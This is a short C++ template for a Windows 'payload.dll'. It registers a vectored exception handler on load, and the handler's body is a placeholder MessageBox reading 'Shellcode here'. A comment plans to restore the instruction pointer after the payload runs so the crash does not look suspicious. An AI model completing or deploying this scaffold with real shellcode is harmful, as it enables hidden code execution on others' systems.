// g++ -shared -o payload.dll DLLfile.cpp
#include <Windows.h>

LONG WINAPI Exceptioner(_EXCEPTION_POINTERS *ExceptionInfo)
{
	MessageBox(0,"Insert", "Shellcode here kitty cat", MB_OK);
	// After executing payload might have it redirect the
	// Rip to its original state to prevent the program from
	// actually crashing because that looks kinda sketchy
	return 1;
}

bool __stdcall DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{
	switch(dwReason)
	{
		case DLL_PROCESS_ATTACH:
		{
			AddVectoredExceptionHandler(1, Exceptioner);
			break;
		}
		case DLL_PROCESS_DETACH:
		{
			break;
		}
	}
	return true;
}
